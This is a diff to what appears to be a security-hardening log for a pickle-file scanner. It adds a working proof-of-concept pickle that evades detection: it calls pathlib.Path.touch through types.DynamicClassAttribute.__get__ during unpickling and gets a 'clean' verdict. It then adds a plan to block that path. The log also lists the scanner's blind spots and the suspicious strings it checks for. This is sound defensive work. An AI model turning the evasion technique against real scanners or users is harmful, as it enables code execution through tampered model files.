@@ -3058,3 +3058,108 @@ Blocking plan:
 Performance note: the fix is a single exact builtin-name membership check. It
 does not add descriptor-object tracking, bound-method state modeling, or stack
 call simulation.
+
+## Turn 67 - `types.DynamicClassAttribute.__get__` descriptor getter gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using the `types` module's
+property-like descriptor helper to call an attacker-selected getter during
+deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_types_dynamicclassattribute_get_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("types", "DynamicClassAttribute"),
+        sg("pathlib", "Path.touch"),
+        b"\x85R\x94",
+        sg("types", "DynamicClassAttribute.__get__"),
+        b"h\x00",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR",
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=177`, `bytes_total=177`, `opcode_count=26`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `types.DynamicClassAttribute`,
+  `pathlib.Path.touch`, `types.DynamicClassAttribute.__get__`, and
+  `pathlib.PosixPath`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final descriptor-get call returns
+  `<types.DynamicClassAttribute ...>` with `fget=pathlib.Path.touch` and does
+  not create `/tmp/ma_types_dynamicclassattribute_get_marker`
+- Unpickle result: the full payload creates
+  `/tmp/ma_types_dynamicclassattribute_get_marker` and returns `None`
+- RCE mechanism: `DynamicClassAttribute.__get__(descriptor, instance)` calls
+  `descriptor.fget(instance)` for non-class access. The payload first
+  constructs `types.DynamicClassAttribute(pathlib.Path.touch)`, then calls the
+  unbound descriptor getter with the attacker-chosen `Path` instance, causing
+  `Path.touch(marker)` to execute before `pickle.loads()` returns.
+
+Why the scanner missed it:
+
+- `types.DynamicClassAttribute` is absent from `DANGEROUS_GLOBALS`; the current
+  `types` coverage only lists `CodeType`, `FunctionType`, and `MethodType`.
+- `types.DynamicClassAttribute.__get__` is also absent from
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals:
+  `types.DynamicClassAttribute`, `pathlib.Path.touch`,
+  `types.DynamicClassAttribute.__get__`, and `pathlib.PosixPath`.
+- The dangerous function is stored inside a synthesized descriptor object, then
+  reached through a clean-looking descriptor method rather than through a
+  directly policy-listed callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is the `types` sibling of the descriptor-getter surface.
+The focused next block should add a sorted `DANGEROUS_GLOBALS` entry for
+`("types", "DynamicClassAttribute.__get__")`, plus a manual-pickle oracle
+regression proving scan-time detection before the descriptor getter creates
+the marker. The hot path remains static binary-search policy lookup.
+
+## Turn 68 - Block `types.DynamicClassAttribute.__get__` descriptor getters
+
+Blocking plan:
+
+- Add `("types", "DynamicClassAttribute.__get__")` to the sorted Rust
+  `DANGEROUS_GLOBALS` table. The descriptor-get method invokes the
+  attacker-controlled `fget` callable when accessed with an instance.
+- Leave `types.DynamicClassAttribute` itself allowed because constructing the
+  descriptor does not call the getter. The sink is the descriptor-get method,
+  mirroring the earlier `property.__get__` block.
+- Add a CPython oracle regression that builds the manual
+  `DynamicClassAttribute(Path.touch)` payload, verifies the control descriptor
+  still scans clean and does not create the marker, then verifies scan-time
+  detection on the RCE variant before proving the getter creates the marker
+  during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]` because this strengthens
+  user-visible pickle detection coverage.
+
+Performance note: the fix adds one tuple to a sorted static table checked with
+binary search. It does not add descriptor-object tracking, dotted-name
+expansion, or stack-flow simulation.
